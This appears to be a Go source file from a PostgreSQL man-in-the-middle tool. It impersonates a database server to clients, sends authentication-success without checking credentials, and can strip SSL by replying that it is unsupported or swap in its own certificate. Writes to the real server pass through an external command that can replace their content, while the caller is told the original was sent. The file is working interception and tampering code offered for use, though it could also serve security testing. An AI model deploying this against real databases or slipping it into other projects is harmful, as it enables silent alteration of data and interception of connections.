package pq

import (
	"bytes"
    "crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
)

var server_version = flag.String("sver", "10.0.0", "Version number to pass to the client")
var cert = flag.String("cert", "", "Cert for ssl auth to client")
var key = flag.String("key", "", "Key for ssl auth to client")

// This is for intercepting writes to the postgres database and altering them in transit.
type Mitm struct {
	net.Conn          // this is the postgres server
	Client   net.Conn // the postgres client psql or a webserver
	Cmdname  *string
}

func (m Mitm) Write(b []byte) (n int, err error) {
	Debug("WRITE")
	if *m.Cmdname != "" {
		res := m.shell(&b, "Write")
		if len(res) != 0 {
			n = len(b) // make the caller think we wrote it all
			_, err = m.Conn.Write(res)
			Debug("We wrote this instead though")
			DebugDump(res)
			return
		}
	}
	n, err = m.Conn.Write(b)
	DebugDump(b[:n])
	return
}

func (m Mitm) Read(b []byte) (n int, err error) {
	n, err = m.Conn.Read(b)
	if err != nil {
		Debug(err)
	} else {
		Debug("READ", n)
	}
	DebugDump(b[:n])
	return
}

func (m Mitm) shell(b *[]byte, name string) []byte {
	cmd := exec.Command(*m.Cmdname, name)
	Debug("shell", cmd)
	cmd.Stdin = bytes.NewReader(*b)
	res, err := cmd.CombinedOutput()
	if err != nil {
		Debug(string(res))
		Debug(err)
	}
	return res
}

func (m Mitm) Close() error {
	var err error
	if m.Conn != nil {
		Debug("Close()", m.Conn.RemoteAddr())
		err = m.Conn.Close()
		if err != nil {
			log.Println(err)
		}
	}
	if m.Client != nil {
		Debug("Close()", m.Client.RemoteAddr())
		err = m.Client.Close()
		if err != nil {
			log.Println(err)
		}
	}
	return err
}

func readN(client net.Conn, n int) {
	Debug("reading", n, "from", client.RemoteAddr())
	b := make([]byte, n)
	n, e := client.Read(b[:])
	if e != nil {
		Debug(e)
	}
	DebugDump(b[:n])
}

func sendReady(client net.Conn) {
	wb := writeBuf([]byte{})
	wb.byte('Z')
	wb.int32(5)
	wb.byte('i')
	n, err := client.Write([]byte(wb))
	if err != nil {
		Debug(err, "trying to send readyforquery")
	} else {
		Debug("sent readyforquery to client", wb, n, err)
	}
}

func sendAuthPlain(client net.Conn) {
	wb := writeBuf([]byte{})
	wb.byte('R')
	wb.int32(8)
	wb.int32(3)
	n, err := client.Write([]byte(wb))
	if err != nil {
		Debug(err, "trying to send AuthClearTextPassword")
	} else {
		Debug("sent AuthenticationCleartextPassowrd to client", wb, n, err)
	}
}

func sendAuthMd5(client net.Conn) {
	wb := writeBuf([]byte{})
	wb.byte('R')
	wb.int32(23)
	wb.int32(5)
	for i := 0; i < 4; i++ {
		wb.byte('A')
	}
	n, err := client.Write([]byte(wb))
	if err != nil {
		Debug(err, "trying to send sendAuthMd5")
	} else {
		Debug("sent sendAuthMd5 to client", wb, n, err)
	}
}

func sendAuthOk(client net.Conn) {
	wb := writeBuf([]byte{})
	wb.byte('R')
	wb.int32(8)
	wb.int32(0)
	n, err := client.Write([]byte(wb))
	if err != nil {
		Debug(err, "trying to send AuthenticationOk")
	} else {
		Debug("sent AuthenticationOk to client", wb, n, err)
	}
}

func addParam(wb *writeBuf, k, v string) {
	l := len(k) + len(v) + 2 + 4
	wb.int32(l)
	wb.string(k)
	wb.string(v)
}

func sendParameter(client net.Conn, k, v string) {
	wb := writeBuf([]byte{})
	wb.byte('S')
	addParam(&wb, k, v)
	_, err := client.Write([]byte(wb))
	if err != nil {
		Debug(err, "trying to send parameter", k, v)
	} else {
		Debug("sent Parameter", k, v)
        DebugDump(wb)
	}
}


func doTLS(client net.Conn, cert, key string) (net.Conn, error) {
    certpem, err := tls.LoadX509KeyPair(cert, key)
            if err != nil {
                return nil, err
            }
    c := new(tls.Config)
    c.Certificates = []tls.Certificate{certpem}
    c.ClientAuth = tls.VerifyClientCertIfGiven
    c.ServerName = "foobar.com"
    tlsConn := tls.Server(client, c)
    Debug("about to do TLS handshake")
    if err = tlsConn.Handshake(); err != nil {
        return nil, err
    } 
    return tlsConn, nil
}

// This is for making the cient think it is connected to a real postgres
// server.
func (m *Mitm) startup() error {
	connstr := fmt.Sprintf("%s %s <-> %s %s", m.Client.RemoteAddr(), m.Client.LocalAddr(), m.Conn.LocalAddr(), m.Conn.RemoteAddr())
	Debug("--------- BEGIN STARTUP for", connstr)
	bc := [100]byte{}
	client := m.Client
	n, _ := client.Read(bc[:])
	rb := readBuf(bc[:n])
	rbi := rb.int32()
	rbi = rb.int32()
	if rbi == 80877103 {
		client := m.Client
        if *cert != "" && *key != "" {
            
            _, err := client.Write([]byte{'S'})
            if err != nil {
                Debug("ERROR sending we support ssl")
            }
            Debug("Did the client respond to the S?")
            m.Client, err = doTLS(client, *cert, *key)
            if err != nil {
                Debug("ERROR in doTLS", err)
            }
            readN(m.Client, 100)

        } else {
		    Debug("The client wants ssl, but we're going to say we don't support it", rbi)
            _, _ = client.Write([]byte{'N'})
            readN(client, 1024)
        }

	}
	/* The right order is this, but it isn't required
	   sendAuthPlain(client)
	   readN(client, 100)
	*/
	sendAuthOk(client)
	sendParameter(client, "client_encoding", "UTF8")
	sendParameter(client, "server_version", *server_version)
	sendReady(client)
	Debug("--------- END STARTUP for", connstr)
	log.Println("client startup complete")
    return nil
}
